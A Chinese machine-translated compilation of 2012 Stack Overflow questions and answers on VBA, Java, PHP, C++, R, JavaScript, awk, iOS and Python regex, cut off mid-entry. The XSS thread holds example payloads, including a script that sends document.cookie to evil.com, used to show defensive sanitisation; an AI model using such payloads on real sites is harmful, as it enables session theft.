我以旧格式对字段进行了编号，从 1 到 6，其中一些字段位于标题中。我需要序列不同的新格式的这些字段。

我是宏的绝对初学者，需要明天提交，所以非常感谢任何帮助或紧急建议。

Word文档下载链接如下：

旧格式：[http ://www.scribd.com/R0cKyMan/d/90470134-Old-Format](http://www.scribd.com/R0cKyMan/d/90470134-Old-Format)

新格式：[http ://www.scribd.com/R0cKyMan/d/90473107-New-Format](http://www.scribd.com/R0cKyMan/d/90473107-New-Format)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T20:27:47.467

> > > 所以你能帮我复制标题字段吗？谢谢 – R0cKy 3 分钟前

* * *

`Header`必须以不同的方式访问表中的表。

当表格在正文中时，您可以像这样使用它

```
ActiveDocument.Tables(1).Cell(1, 1).Select
Selection.Copy 
```

但是要访问其中的表，`Header`您必须访问`Section`Header 所在的表。在你的情况下，桌子在`wdHeaderFooterPrimary`

试试这个

```
Option Explicit

Sub Sample()
    '~~> Copies the 2nd Cell in the first row of a table which is in the Header
    ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.Tables(1).Cell(1, 2).Select
    Selection.Copy

    '~~> Pastes it in say 1st cell in Row 1 of a table which is in the body
    ActiveDocument.Tables(1).Cell(2, 3).Select
    Selection.PasteAndFormat (wdPasteDefault)
End Sub 
```

希望这能让你开始。

# java - 将具有最低值的键转置到集合

> ID：10270392
> 
> 赞同：2
> 
> 时间：2012-04-22T17:41:33.640
> 
> 标签：java, collections, hashmap, set

我有一张词频图`Map<String, Integer>`。我需要制作一组最少出现的单词。假设最低出现的词都出现了两次，我需要将所有这些重复出现的词做一组。到目前为止，我有：

```
public Set findRarest()
{
    int occurrence = 1000;  //high initial value for word length
    for (Map.Entry<String,Integer> item : wcMap.entrySet())
    {
        if (item.getValue() > occurrence);        //most likely for performance
        else if (item.getValue() == occurrence)
        {
            rarest.add(item.getKey());
        }
        else                                      //found new lowest count
        {
            rarest.clear();
            rarest.add(item.getKey());
        }
    }
    return rarest;
} 
```

这对我来说似乎有点令人费解。是否有本地收集工具来完成这项工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:44:21.740

我认为您的代码甚至无法按书面方式工作。两件事情：

1.  `occurrence`使用`Integer.MAX_VALUE`而不是仅使用一些任意大值进行初始化。

2.  `occurrence`每当您发现一个出现频率较低的单词时，更新 的值。

除此之外，您的解决方案很好。我不确定您是否可以更清晰地将自己限制在[Java Collections Framework](http://docs.oracle.com/javase/6/docs/technotes/guides/collections/index.html)类中。

更新代码：

```
public Set findRarest()
{
    Set<String> rarest = new HashSet<String>();

    int occurrence = Integer.MAX_VALUE;  //high initial value for word length
    for (Map.Entry<String,Integer> item : wcMap.entrySet())
    {
        if (item.getValue() == occurrence)
        {
            rarest.add(item.getKey());
        }
        else if ( item.getValue() < occurrence )
        {
            occurrence = item.getValue();
            rarest.clear();
            rarest.add(item.getKey());
        }
    }
    return rarest;
} 
```

# php - PHP - 多张图片上传，如何允许多种格式？

> ID：10270395
> 
> 赞同：0
> 
> 时间：2012-04-22T17:41:54.980
> 
> 标签：php, image, upload, image-formats

我在 webby 上找到了一个免费的图片上传脚本，但它只允许 JPG/JPEG 格式。

如何允许它上传格式 PNG 和 BMP？

```
for($i=0;$i<count($_FILES["fileUpload"]["name"]);$i++)  
{  
    if(trim($_FILES["fileUpload"]["tmp_name"][$i]) != "")  
    {  
        $images = $_FILES["fileUpload"]["tmp_name"][$i];  
        $new_images = "thumbnails_".$_FILES["fileUpload"]["name"][$i];  
        copy($_FILES["fileUpload"]["tmp_name"][$i],"PIC_FOLDER".$_FILES["fileUpload"]["name"][$i]);  
        $width=100; //*** Fix Width & Heigh (Autu caculate) ***//  
        $size = GetimageSize($images);  
        $height = round($width*$size[1]/$size[0]);  
        $images_orig = ImageCreateFromJPEG($images);  
        $photoX = ImagesX($images_orig);  
        $photoY = ImagesY($images_orig);  
        $images_fin = ImageCreateTrueColor($width, $height);  
        ImageCopyResampled($images_fin, $images_orig, 0, 0, 0, 0, $width+1, $height+1, $photoX, $photoY);  
        ImageJPEG($images_fin,"PIC_FOLDER".$new_images);  
        ImageDestroy($images_orig);  
        ImageDestroy($images_fin);  

        echo "Resize Successful.<br>";
    }  
} 
```

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:04:31.433

正如评论所说，您已经能够上传任何类型，但您需要它是 jpeg 才能制作缩略图。只需检查类型，然后使用它打开图像

```
 $src= $images;
    $image_info = @getimagesize($src);
    list($imgwidth,$imgheight,$image_type) = $image_info;
    if( $image_type == IMAGETYPE_JPEG ) {
        $images_orig    = @imagecreatefromjpeg($src);
    } else if( $image_type == IMAGETYPE_GIF ) {
        $images_orig    = @imagecreatefromgif($src);
    } else if( $image_type == IMAGETYPE_PNG ) {
        $images_orig    = @imagecreatefrompng($src);
    } else if( $image_type == IMAGETYPE_BMP ) {
        $images_orig    = @imagecreatefrombmp($src);
    } 
```

只需使用它而不是 $images_orig = ImageCreateFromJPEG($images);

如果您还想以任何格式保存图像，请在底部进行类似检查，而不是 ImageJPEG($images_fin,"PIC_FOLDER".$new_images);

# c++ - 头文件的 C++ 样式

> ID：10270396
> 
> 赞同：1
> 
> 时间：2012-04-22T17:42:02.473
> 
> 标签：c++, coding-style, header, header-files

假设我有以下文件：

1.  主文件
2.  例程.cpp
3.  例程.h

进一步假设 main.cpp 调用了一个`routine()`在routine.cpp 中定义的函数，但routine.cpp 还包含**仅**由该函数使用的`routine()`函数。换句话说，routine.cpp 包含仅从routine.cpp 中调用的函数和从其他源文件调用的函数。

显然 main.cpp 将包含`#include "routine.h"`. 但是routine.h 是否应该包含在routine.cpp 中定义的**所有**函数的原型（样式A），或者routine.h 是否应该**只**包含从其他源文件调用的函数的原型（样式B）？

我总是在样式 A 之后编写代码，但最近我想知道样式 B 在样式上是否更有意义。（如果使用样式 B，则仅在routine.cpp 中使用的函数的原型可能位于routine.cpp 的顶部，或者定义可以简单地在其使用之前。）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T17:48:28.563

通常，标头只包含公共接口的方法（如果这些是自由函数）。`routine.cpp`您可以声明在匿名命名空间中使用的辅助方法。

```
//routine.h

void foo();
void goo();

//routine.cpp

namespace
{
   void fooHelper() {}
   void gooHelper() {}
}

void foo()
{
   fooHelper();
}
void goo()
{
   gooHelper();
} 
```

这样的函数以前是声明`static`的，这给了它们内部链接，但现在的一般风格是使用匿名命名空间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:49:16.527

Google 的风格指南非常全面。它为他们的选择提供了利弊和理由。 [http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml](http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T17:54:40.023

routine.h 不应包含那些不打算在routine.cpp（样式B）之外使用的函数的声明。

# r - R中未使用的参数

> ID：10270397
> 
> 赞同：29
> 
> 时间：2012-04-22T17:42:03.503
> 
> 标签：r

是否可以让软件忽略在运行模块时定义了未使用的参数这一事实？

例如，我有一个模块，它返回和`multiply(a,b)`的乘积。如果我像这样调用模块，我会收到一个错误：`a``b`

```
multiply(a=20,b=30,c=10) 
```

对此返回错误似乎有点不必要，因为所需的输入`a`和`b`已指定。是否有可能避免这种不良行为？

一个简单的解决方案就是停止指定`c`，但这并不能解释为什么 R 会这样。还有其他方法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-04-22T17:46:51.497

更改 multiply 的定义以获取额外的未知参数：

```
multiply <- function(a, b, ...) {
  # Original code
} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2018-04-20T20:02:05.157

R.utils 包有一个名为 doCall 的函数，它类似于 do.call，但如果传递了未使用的参数，它不会返回错误。

```
multiply <- function(a, b) a * b

# these will fail
multiply(a = 20, b = 30, c = 10)
# Error in multiply(a = 20, b = 30, c = 10) : unused argument (c = 10)
do.call(multiply, list(a = 20, b = 30, c = 10))
# Error in (function (a, b)  : unused argument (c = 10)

# R.utils::doCall will work
R.utils::doCall(multiply, args = list(a = 20, b = 30, c = 10))
# [1] 600
# it also does not require the arguments to be passed as a list
R.utils::doCall(multiply, a = 20, b = 30, c = 10)
# [1] 600 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-04-22T17:47:46.133

一种方法（我无法想象这是良好的编程习惯）是添加`...`传统上用于将一个函数中指定的参数传递给另一个函数的方法。

```
> multiply <- function(a,b) a*b
> multiply(a = 2,b = 4,c = 8)
Error in multiply(a = 2, b = 4, c = 8) : unused argument(s) (c = 8)
> multiply2 <- function(a,b,...) a*b
> multiply2(a = 2,b = 4,c = 8)
[1] 8 
```

[您可以在此处](http://manuals.bioinformatics.ucr.edu/home/programming-in-r)阅读更多关于`...`旨在使用的信息

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-04-22T17:48:48.847

您可以在函数定义中使用点：`...`。

```
myfun <- function(a, b, ...){
  cat(a,b)
}

myfun(a=4,b=7,hello=3)

# 4 7 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2017-04-06T01:32:07.123

我和你有同样的问题。我有一长串论据，其中大部分是无关紧要的。我不想硬编码它们。这就是我想出的

```
library(magrittr)
do_func_ignore_things <- function(data, what){
    acceptable_args <- data[names(data) %in% (formals(what) %>% names)]
    do.call(what, acceptable_args %>% as.list)
}

do_func_ignore_things(c(n = 3, hello = 12, mean = -10), "rnorm")
# -9.230675 -10.503509 -10.927077 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-05-17T10:40:11.960

R 有一个函数 prod() 可以很好地进行乘法运算。提问者给出的示例在 prod() 函数中运行良好，不会返回错误。`

```
prod(a=20,b=30,c=10)

 # 6000 
```

在任何情况下，突出显示的错误都是纠正它的机会，所以不是坏行为。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-06-02T05:32:15.310

由于已经有许多答案直接解决了这个问题，而且 R 经常被技术熟练的非程序员使用，让我快速概述错误存在的原因，并建议不要使用抑制解决方法。

参数的数量是定义函数的一个重要方面。如果参数的数量不匹配，这很好地表明调用者的意图与函数将要执行的操作之间存在不匹配。出于这个原因，这将是许多编程语言中的编译错误，包括 Java、Python、Haskell 和许多其他语言。事实上，如果类型不匹配，许多这些语言中更严格的类型检查也会导致错误。

随着程序规模的增长和代码的老化，很难发现这种不匹配是有意的还是真正的错误。这就是为什么“干净代码”的想法——简单易读的代码，没有错误或警告——通常是专业程序员的标准工作。

因此，我建议重新编写代码以删除不必要的参数。以后为自己和他人理解和调试会更简单。

当然，我知道 R 用户经常使用生命周期有限的小脚本，而大型软件工程项目的通常权衡并不总是适用。也许对于您的快速脚本，它只会使用一周，只是抑制错误是有意义的。然而，人们普遍观察到（我从我自己的经验中看到），在撰写本文时，代码的持久性很少是显而易见的。如果您正在追求开放科学，并发布您的代码和数据，那么该代码在未来对其他人有用，这样他们就可以重现您的结果，这将特别有帮助。

# php - 清理 XSS 到 Textarea 的输出

> ID：10270398
> 
> 赞同：1
> 
> 时间：2012-04-22T17:42:04.563
> 
> 标签：php, css, textarea, xss, sanitize

如果要在 textareas 之类的输入中使用它们，那么从数据库（在 php 中）清理值的最佳方法是什么？

例如，在插入数据时，我可以去掉标签和引号并用 html 字符代码替换它们，然后在插入之前使用 mysql_real_escape_string。

检索该数据时，我需要它显示在文本区域中。我怎样才能做到这一点并且仍然避免 XSS？（例如，您可以轻松输入

```
</textarea><script type='text/javascript'> Malicious Code</script><textarea> 
```

) 并导致问题。

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T19:12:44.513

我想我更喜欢组合，`filter_var`如果`url_decode`你想使用纯简单的 php 解决方案

## 原因

想象一下这样的估算

```
$maliciousCode = "<script>document.write(\"<img src='http://evil.com/?cookies='\"+document.cookie+\"' style='display:none;' />\");</script> I love PHP"; 
```

如果我使用`strip_tags`

```
var_dump(strip_tags($maliciousCode)); 
```

输出

```
string 'document.write("' (length=16) 
```

如果我使用`htmlspecialchars`

```
var_dump(htmlspecialchars($maliciousCode)); 
```

输出

```
string '&lt;script&gt;document.write(&quot;&lt;img src='http://evil.com/?cookies='&quot;+document.cookie+&quot;' style='display:none;' /&gt;&quot;);&lt;/script&gt; I love PHP' (length=166) 
```

## 我的选择

```
function cleanData($str) {
    $str = urldecode ($str );
    $str = filter_var($str, FILTER_SANITIZE_STRING);
    $str = filter_var($str, FILTER_SANITIZE_SPECIAL_CHARS);
    return $str ;
}

$input = cleanData ( $maliciousCode );
var_dump($input); 
```

输出

```
 string 'document.write(&#38;#34;&#38;#34;); I love PHP' (length=46) 
```

如果使用表单`GET`而不是`POST`一些可以直到转义的表单，如果它是 url 编码的，那么您可以获得最少的信息并确保最终文本是无害的

也有足够的在线课程可以帮助您进行过滤查看

*   [http://www.phpclasses.org/package/2189-PHP-Filter-out-unwanted-PHP-Javascript-HTML-tags-.html](http://www.phpclasses.org/package/2189-PHP-Filter-out-unwanted-PHP-Javascript-HTML-tags-.html)

*   [http://htmlpurifier.org/](http://htmlpurifier.org/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T17:52:55.613

[HTMLpurifier](http://htmlpurifier.org/)是一个很好的工具，可以清除不需要的 HTML，尤其是不需要的 JavaScript。还[`htmlspecialchars()`](http://us2.php.net/manual/en/function.htmlspecialchars.php)建议使用它来输出用户提供的内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-19T21:42:43.703

在我的联系表单上收到垃圾邮件发送者后，我扩展了清理文本框用户输入的功能。它现在还涵盖了多行文本区域输入

我需要格式化正常显示以及来自我的联系页面的 html 电子邮件。它还提供了我也使用的纯文本电子邮件格式的选项。

```
function clean_text($text, $html = true)
{ if($text == ""){return "";}
  $text = nl2br($text,false); // false gives <br>, true gives <br />
  $textary = explode("<br>",$text);
  foreach($textary as $key => $val)
  { $val = trim($val);
    $val = stripslashes($val);
    $val = htmlspecialchars($val);
    $textary[$key] = $val;
  }
  if ($html)
  { return implode("<br />",$textary);} //return implode("<br>",$textary);
  else
  { return implode("\r\n",$textary);}
} 
```

顺便说一句...感谢 SO 成员参与我的 PHP 学习。

[http://www.microcal.ca/scripts/cleantext.php](http://www.microcal.ca/scripts/cleantext.php)上的示例

# javascript - Javascript计时器问题

> ID：10270400
> 
> 赞同：2
> 
> 时间：2012-04-22T17:42:12.517
> 
> 标签：javascript, jquery

尝试像以下方式制作计时器：

**HTML：**

```
<div id="timer">
     <span id="minute" class="dis">00</span> :
     <span id="second" class="dis">00</span> :
     <span id="milisecond" class="dis">00</span>
 </div>

 <input type="button" value="Start/Stop" id="startStop" />
 <input type="button" value="Reset" id="reset" /> 
```

**jQuery：**

```
 var a = false,
         t = null,
         ms = 0,
         s = 0,
         m = 0,
         dl = 10,
         now = null,
         before = new Date(),
         El = function(id) { return document.getElementById(id);};

     function dsp() {
         if(ms++ == 99){
              ms = 0;
             if(s++ == 59) {
                 s = 0;
                 m++;
             } else s = s;
         } else ms = ms;    
         El('milisecond').innerHTML = ms
         El('second').innerHTML = s < 10 ? '0' + s : s;
         El('minute').innerHTML = m < 10 ? '0' + m : m;
     }

     function r() {
         a = true;
         var els = document.getElementsByClassName('dis');
         ms = s = m = 0;
         sw();        
         for(var i in els)  {
             els[i].innerHTML = '00';    
         }
     }

     function sw() {
         a ? clearInterval(t) : t = setInterval(dsp, dl);
         a = !a;
     }
     El('startStop').addEventListener('click', sw, true);
     El('reset').addEventListener('click', r, true); 
```

它工作得很好。但问题是当窗口切换或选项卡更改发生时它会停止执行。在提交此问题之前，我阅读[了此线程](https://stackoverflow.com/questions/5927284/how-can-i-make-setinterval-also-work-when-a-tab-is-inactive-in-chrome)，但未能在我的代码段中实现它。

请帮我一些解决方案或建议..

这是[小提琴](http://jsfiddle.net/XhGeX/4/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:04:52.557

捕获开始时间（参见[Marc 的评论](https://stackoverflow.com/questions/10270400/javascript-timer-issue/10270624#comment13207773_10270400)）并跟踪之前的运行（`offset`）：

```
var a = false;
var dl = 10;
var El = function(id) { return document.getElementById(id);};
var start = null; // starting time of current measurement
var offset = 0;   // offset for previous measurement

function dsp() {
    var tmp = new Date(new Date() - start + offset ); // calculate the time
    var ms = tmp.getMilliseconds();
    var m = tmp.getMinutes();
    var s = tmp.getSeconds();
    El('milisecond').innerHTML = ms;
    El('second').innerHTML = s < 10 ? '0' + s : s;
    El('minute').innerHTML = m < 10 ? '0' + m : m;
}

function r() {
    a = true;
    var els = document.getElementsByClassName('dis');    
    sw();
    offset = 0; // Clear the offset
    for(var i in els)  {
        els[i].innerHTML = '00';    
    }
}

function sw() {
    if(a){
    // If the timer stops save the current value
        offset += (new Date()) - start;
    }else
        start = new Date();
    a ? clearInterval(t) : t = setInterval(dsp, dl);
    a = !a;
}
document.getElementById('startStop').addEventListener('click', sw, true);
document.getElementById('reset').addEventListener('click', r, true); 
```

[**JSFiddle**](http://jsfiddle.net/XhGeX/2/)

# javascript - 在 Javascript 中获得多维数组的准确字符串表示的单行器

> ID：10270401
> 
> 赞同：0
> 
> 时间：2012-04-22T17:42:15.280
> 
> 标签：javascript

观察：

```
> var x=[[1,2],[3,4]]
> x
[ [ 1, 2 ], [ 3, 4 ] ]
> x + ""
1,2,3,4
> x.toString()
1,2,3,4
> 
```

我正在寻找一个单班轮来获得类似的东西`"[[1,2],[3,4]]"`。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:45:27.247

```
var x=[[1, 2], [3, 4]];
JSON.stringify(x); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:47:50.470

你可以使用这个 JSON 编码函数：

[http://www.openjs.com/scripts/data/json_encode.php](http://www.openjs.com/scripts/data/json_encode.php)

它应该为您提供您想要的大致内容，并且与跨浏览器兼容，但它不是单行的。

# awk - awk 将多列文件打印成单列

> ID：10270402
> 
> 赞同：1
> 
> 时间：2012-04-22T17:42:25.523
> 
> 标签：awk

我的文件如下所示：

> 315
> 717
> 461 737
> 304
> 440
> 148 206 264 322 380 438 496
> 801
> 495
> 355
> 249 989
> 768
> 946

我想在一个列文件（一个长的第一列）中打印所有这些列。

如果我尝试

`awk '{print $1}'> new_file;` `awk '{print $2}' >> new_file`

中间有空格。如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T19:55:20.297

也许有点神秘：

```
awk '1' RS='[[:space:]]+' inputfile 
```

它说“打印每条记录，将任何空格视为记录分隔符”。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T17:52:54.807

你可以简单地使用类似的东西：

```
awk '{ for (i=1; i<=NF; i++) print $i }' file 
```

对于每一行，遍历列，并在新行中打印每一列。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-22T21:02:35.543

你不需要这么多`sed`：只需将空格转换为换行符

```
tr ' ' '\n' < file 
```

`tr`纯粹是一个过滤器，因此您必须将文件重定向到其中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-22T21:31:34.890

一个`perl`解决方案：

```
perl -pe 's/\s+(?=\S)/\n/g' infile 
```

输出：

```
315
717
461
737
304
440
148
206
264
322
380
438
496
801
495
355
249
989
768
946 
```

# iphone - 将委托与 TabBarController 一起使用

> ID：10270406
> 
> 赞同：0
> 
> 时间：2012-04-22T17:43:01.583
> 
> 标签：iphone, objective-c, ios

我有一个 TabBarController，它在启动时设置了多个 ViewController。当用户单击按钮时，我想将它们发送到 TabBarController 中的不同 ViewController，并通过委托传递数据。

我有一个协议和委托设置。但是，什么时候设置委托，因为所有的 ViewControllers 都在 TabBarController

这可能吗，当用户单击按钮时，如何将数据传递给 TabBar 中的另一个 ViewController。任何想法，我真的很想使用代表。

```
- (IBAction)sendData:(id)sender
{
    [self.delegate setStringData:strData];
    self.tabBarController.selectedIndex = 0;
} 
```

编辑：

因此，假设我有一个 TabBarController，其中包含两个 ViewController，分别称为 ViewControllerOne 和 ViewControllerTwo。

我将 ViewControllerTwo 设置为委托和协议。这是按下按钮后将向 ViewControllerOne 发送数据的 ViewController。ViewControllerOne 实现协议并包含方法 setStringData 应在 ViewControllerTwo 中的按钮被按下后调用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:03:39.500

从 UIViewController 你想更改选定的标签栏索引并传递数据。我建议您为此在应用程序委托中添加一个功能。这样你的 UIViewController 就不会与 UITabBar 绑定（如果明天你想使用不同的 UI 习惯，你只需要在你的应用程序委托中更改你的函数的实现）。

要传递数据，您可以尝试在您的函数中进行自省：您获取新选定选项卡索引的当前 UIViewController，验证它是否响应您的选择器并调用该函数。

编辑 ：

假设您“只是”必须更改选定的 tabBar 索引（例如，您的 UIViewController 在新的 tab bar 索引上将始终相同）。

在您的第一个视图控制器中：

```
    - (IBAction)sendData:(id)sender
    {
        UIApplicationDelegate * appDelegate = [[UIApplication sharedApplication] 委托];
        if ([appDelegate respondToSelector:@selector(goToFirstTabBarWithData:)])
        {
            [appDelegate performSelector:@selector(goToFirstTabBarWithData:) withObject: strData];
        }
    }

```

在您的 Appdelegate 中：

```
    - (void)goToFirstTabBarWithData:(NSString *)data
    {
        self.tabBarController.selectedIndex = 0;
        UIViewController * vc = [self.tabBarController.viewControllers objectAtIndex:0];
        if ([vc respondToSelector:@selector(setStringData:)])
        {
            [vc performSelector:@selector(setStringData:) withObject:data];
        }
    }

```

在您的第二个视图控制器（您将到达的那个）中：

```
    - (void)setStringData:(NSString *)data
    {
        // 做点什么...
    }

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T00:42:46.173

我找到了一个更简单的解决方案来解决我的问题。在 ViewControllerTwo 内部，我只是创建了一个 ViewControllerOne 的实例并将我需要的数据传递给它。然后我将 tabBarController 索引更改为 ViewControllerOne。

例如：

```
// A method inside of ViewControllerTwo
ViewController *viewcontrollerOne = [ViewcontrollerOne alloc] init];
[viewcontrollerOne setStringData:str];
[viewcontrollerOne release];
self.tabBarController.selectedIndex = 0; 
```

# python - python中十六进制字符串的正则表达式不起作用

> ID：10270407
> 
> 赞同：7
> 
> 时间：2012-04-22T17:43:10.987
> 
> 标签：python, regex, hex

我有一个正则表达式来匹配字符串，例如：

> --D2CBA65440D
> 
> --77094A27E09
> 
> --77094A27E
> 
> --770
> 
> --77094A27E09--

基本上，它匹配一个由一个或多个换行符或空格包围的十六进制字符串，并具有前缀——可能有也可能没有——作为后缀

我使用以下 python 代码，它大部分时间都可以正常工作：

```
hexaPattern = "\s--[0-9a-fA-F]+[--]?\s"
hex = re.search(hexaPattern, part)
if hex:
   print "found a match" 
```

这适用于上述所有内容，但与此块中的 --77094A27E09 不匹配：

```
<div id="arrow2" class="headerLinksImg" style="display:block

--77094A27E09

;"> 
```

但匹配相同的字符串：

```
<input type="checkbox" name="checkbox" id="checkboxKG3" class

--77094A27E09

Content-T="checkboxKG" value="KG3" /> 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-22T17:54:08.990

```
import re
hexaPattern = re.compile(r'\s--([0-9a-fA-F]+)(?:--)?\s')
m = re.search(hexaPattern, part)
if m:
   print "found a match:", m.group(1) 
```

这会预编译模式以提高速度。这使用`r''`（原始字符串），因此反斜杠肯定会正确传递。这会添加括号以创建“匹配组”，以便您可以在匹配后提取十六进制字符串；它还在第二个`--`字符串周围添加了一个“非匹配组”。

因为您在第二个“--”周围使用了方括号，所以您得到了一个“字符类”。我不确定字符类到底`[--]`匹配什么；我认为它应该匹配任何`'-'`字符。在字符类中，'-' 通常用于范围，如 in`[a-z]`但范围`[--]`没有意义，所以我认为它会回退到仅匹配 a `'-'`。问题是：因为你有它`?`之后，它只会匹配零个或一个`'-'`字符，你需要它能够匹配两个。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-22T17:49:28.833

试试这个： `hexaPattern = r"^--[0-9a-fA-F]+(--)?\s"`

我插入的修复是：

r 开头，这样反斜杠就不会被引号“吃掉”

^ 在开头匹配字符串的开头

然后`--`用括号代替方括号（括号似乎是一个错误）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T19:30:12.457

其他人指出了您的正则表达式的问题，即`[--]`它基本上以非常规的方式找到一个连字符......无论哪种方式，都不是您想要的。

我还建议`\s`在正则表达式的开头和结尾都有在某些情况下也会导致问题，因为它匹配`spaces`,`tabs`和`newlines`. 因此，您最终可能会遇到您的文件具有`--77094A27E09\n--D2CBA65440D`而第二个文件不匹配的情况，因为换行符在前一个匹配结束时`--D2CBA65440D`被消耗。`\s`

此外，您似乎正在单独检查文件中的每一行，而您实际上并不需要这样做。您可以`re.findall`一举获得所有比赛。

最后`--`，字符串的开头似乎是您真正的标记，而不是`\s`开头或结尾。那么为什么不只使用`--([0-9a-fA-F]+)(?:--)?`十六进制数周围的组。`findall`只返回你想要的组。然后你可以这样做（将整个 html 文件读入一个字符串，并检查所有匹配项）：

```
text = """
<input type="checkbox" name="checkbox" id="checkboxKG3" class
--D2CBA65440D
<a>    --77094A27E09--  </a>
  hello world  --77094A27E
--770--
    --77094A27E09
Content-T="checkboxKG" value="KG3" />
"""
import re
hexapattern = r'--([0-9a-fA-F]+)(?:--)?'
print re.findall(hexapattern, text)
>>> ['D2CBA65440D', '77094A27E09', '77094A27E', '770', '77094A27E09'] 
```

我认为这是你想要的

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-04-25T21:27:42.147

我使用了以下内容：

```
pattern = re.compile(r'(\n--)([0-9A-F]+)(--)?', re.I | re.S | re.M) 
```

它工作得很好。感谢您的所有贡献。

# java - 在 Java 类文件中使用方法

> ID：10270408
> 
> 赞同：1
> 
> 时间：2012-04-22T17:43:13.407
> 
> 标签：java, class, import

对于类，我得到了一个 .class 文件（没有 .java），我需要在该 .class 文件中创建一些方法的 JUnit 测试。但是，我不确定如何访问该方法。顺便说一句，我正在使用 Eclipse。

我可以导入文件路径，但看不到 .class 文件。意义 。. . 该文件是/class/file/utility/StringUtility.class。

导入类.file.utility.*；（作品）导入class.file.utility.StringUtility；（给出错误）

我尝试使用第一个导入，但是当我尝试访问类文件时遇到了类似的问题。意义 。. .

StringUtility newUtil = new StringUtility(); （给出错误 - 它不知道 StringUtility 是什么。

任何帮助，将不胜感激。

下方解决方案 下方解决方案 下方解决方案

由于我是论坛的新手，我无法回答自己的问题。但是，这是解决方案。. .

谢谢你们每一个人的帮助！您为我指明了正确的方向，我能够解决我的问题。如果其他人遇到同样的问题，这就是我解决它的方法。同样，我正在使用 Eclipse (Indigo)。

1) 文件 -> 导入 -> 存档文件

点击下一步

然后我浏览到正确的目录并使用我的 .class 文件选择了 zip 文件。

这将档案添加到我的项目中。

2) 右键单击​​项目。选择构建路径 -> 配置构建路径

在“库”选项卡下，我选择了“添加类文件夹”。然后我选择了我刚刚添加的带有 .class 文件的文件夹。

然后我输入 StringUtil newUtil; 和“快速修复”对代码的导入。

希望这可以节省我花了四个小时整理它的时间。:)

再次感谢大家的意见。正如我所提到的，他们很有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:58:24.753

从命令行，您可以运行`javap`命令以查看类文件中的内容并了解您的方位。例如，如果您收到的文件被调用`Test.class`，请在文件实际所在目录的命令提示符中键入：

```
javap Test 
```

以上将允许您找到导入类的正确包，并查看类文件中的方法签名。

另外，我怀疑正确的导入语句应该是：

```
import file.utility.StringUtility 
```

也就是说，假设您自己的类位于正确的包中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:46:28.617

该类的实际包很可能是`file.utility`，这意味着您应该将该`class`文件夹添加到测试项目的构建路径中，并相应地调整您的导入。

# database - ASP.NET.One 数据库表没有转换为实体数据模型？

> ID：10270410
> 
> 赞同：0
> 
> 时间：2012-04-22T17:43:22.673
> 
> 标签：database, asp.net-mvc, ado.net-entity-data-model

我的数据库中有 3 个表，如下所示：

![在此处输入图像描述](../Images/f677199f9a65de8cb1bac3eca6bd8be8.png)

在我的 ASP.NET Mvc 应用程序中。我使用实体数据模型。当我将数据库转换为实体数据模型时，TBL_VOTES_ARTICLE 表未转换。其他人被转换。

为什么会这样？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:03:03.387

您使用的是哪种 Visual Studio？

我会尝试将表 TBL_VOTES_ARTICLE 重命名为 TBL_VOTES_ARTICLE1 有时它会有所帮助，如果不是你必须去 sql server manager 我会尝试添加一个新的主键 TBL_VOTES_ARTICLEID 使其标识并从其他两个字段中删除主键

# google-maps - Google maps api 2中的缩放更改侦听器

> ID：10270419
> 
> 赞同：1
> 
> 时间：2012-04-22T17:44:08.137
> 
> 标签：google-maps, google-maps-api-3, google-maps-api-2

我的网页上有 Google Maps API2，我想要“zoom_change”事件来防止用户缩小。

在谷歌地图 API3 中有一个名为“zoom_changed”的事件，但如果有人知道请帮助我，我找不到 API2 的相同事件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:23:49.483

事件是`zoomend`。

[https://developers.google.com/maps/documentation/javascript/v2/reference#GMap2.zoomend](https://developers.google.com/maps/documentation/javascript/v2/reference#GMap2.zoomend)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:27:26.803

```
....
var map = new GMap2(document.getElementById("map_canvas"));
....
GEvent.addListener(map, "zoomend", function(oldzoomlevel, newzoomlevel) {
  alert(oldzoomlevel +" " + newzoomlevel);
}); 
```

[**这里的例子。**](http://jsfiddle.net/heera/8eH8e/1/)

[**关于更多 GEvents**](http://econym.org.uk/gmap/gevent.htm)

# math - 投票 - 投票数与投票百分比？

> ID：10270421
> 
